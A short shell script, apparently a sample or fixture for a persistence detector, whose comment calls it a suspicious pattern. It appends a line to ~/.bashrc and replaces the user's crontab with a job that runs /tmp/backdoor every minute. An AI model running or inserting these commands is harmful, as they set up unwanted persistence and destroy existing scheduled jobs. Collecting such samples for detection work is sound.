#!/bin/sh
# Suspicious pattern: install persistence via shell startup and cron.
echo 'malicious-startup' >> "$HOME/.bashrc"
echo '* * * * * /tmp/backdoor' | crontab -
